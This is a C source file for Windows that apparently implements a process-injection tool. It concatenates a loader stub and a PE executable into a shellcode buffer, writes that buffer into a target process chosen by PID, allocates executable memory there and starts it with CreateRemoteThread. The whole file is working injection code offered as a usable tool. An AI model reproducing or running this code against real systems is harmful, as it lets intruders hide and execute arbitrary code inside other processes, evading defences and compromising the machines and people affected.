#include "Utils/Utils.h"

INT main(INT argc, CHAR** argv) {

	if (argc > 3)
	{
		LPCSTR szPeFile = argv[1];
		LPCSTR szStubFile = argv[2];
		DWORD dwPid = atoi(argv[3]);

		HANDLE hStubFile = NULL;
		if (!(hStubFile = CreateFileA(
			szStubFile,
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		)) || INVALID_HANDLE_VALUE == hStubFile)
		{
			ReportApiError("CreateFileA", "cannot open the supplied stub file");
			return FALSE;
		};

		HANDLE hExeFile = NULL;
		if (!(hExeFile = CreateFileA(
			szPeFile,
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		)) || INVALID_HANDLE_VALUE == hExeFile)
		{
			ReportApiError("CreateFileA", "cannot open the supplied exe file");
			return FALSE;
		};

		LARGE_INTEGER u32StubSize;
		if (!GetFileSizeEx(
			hStubFile,
			&u32StubSize
		))
		{
			ReportApiError("GetFileSizeEx", "cannot get the size of the supplied stub file");
			return FALSE;
		};

		LARGE_INTEGER u32ExeSize;
		if (!GetFileSizeEx(
			hExeFile,
			&u32ExeSize
		))
		{
			ReportApiError("GetFileSizeEx", "cannot get the size of the supplied exe file");
			return FALSE;
		};

		LPVOID lpShellcode = NULL;
		if (!(lpShellcode = VirtualAlloc(
			NULL,
			(SIZE_T)(u32StubSize.QuadPart + u32ExeSize.QuadPart),
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_READWRITE
		)))
		{
			ReportApiError("VirtualAlloc", "cannot allocate memory for the shellcode");
			return FALSE;
		};

		DWORD dwReadBytes = 0;
		if (!ReadFile(
			hStubFile,
			lpShellcode,
			(DWORD)u32StubSize.QuadPart,
			&dwReadBytes,
			NULL
		) || dwReadBytes != u32StubSize.QuadPart)
		{
			ReportApiError("ReadFile", "cannot read the stub file");
			return FALSE;
		};

		if (!ReadFile(
			hExeFile,
#if defined(_M_X64) || defined(__amd64__)
			(LPVOID)((ULONGLONG)lpShellcode + dwReadBytes),
#else
			(LPVOID)((ULONGLONG)lpShellcode + dwReadBytes),
#endif
			(DWORD)u32ExeSize.QuadPart,
			&dwReadBytes,
			NULL
		) || dwReadBytes != u32ExeSize.QuadPart)
		{
			ReportApiError("ReadFile", "cannot read the exe file");
			return FALSE;
		};

		HANDLE hProcess = NULL;
		if (!(hProcess = OpenProcess(
			PROCESS_ALL_ACCESS,
			FALSE,
			dwPid
		)))
		{
			ReportApiError("OpenProcess", "cannot open the target pid");
			return FALSE;
		};

		LPVOID lpAllocatedBase = NULL;
		if (!(lpAllocatedBase = VirtualAllocEx(
			hProcess,
			NULL,
			(SIZE_T)(u32StubSize.QuadPart + u32ExeSize.QuadPart),
			(MEM_COMMIT | MEM_RESERVE),
			PAGE_EXECUTE_READWRITE
		)))
		{
			ReportApiError("VirtualAllocEx", "cannot allocate at the remote process for the shellcode");
			return FALSE;
		};

		SIZE_T stWrittenBytes = 0;
		if (!WriteProcessMemory(
			hProcess,
			lpAllocatedBase,
			lpShellcode,
			(SIZE_T)(u32StubSize.QuadPart + u32ExeSize.QuadPart),
			&stWrittenBytes
		) || stWrittenBytes != u32StubSize.QuadPart + u32ExeSize.QuadPart)
		{
			ReportApiError("WriteProcessMemory", "cannot write at the remote process");
			return FALSE;
		};

		if (!CreateRemoteThread(
			hProcess,
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)lpAllocatedBase,
			NULL,
			0,
			NULL
		))
		{
			ReportApiError("CreateRemoteThread", "cannot create a new thread at the remote process");
			return FALSE;
		};
		CloseHandle(hProcess);
	}
	else
	{
		printf("%s [exe] [stub] [pid]\n", argv[0]);
	}
	return TRUE;
}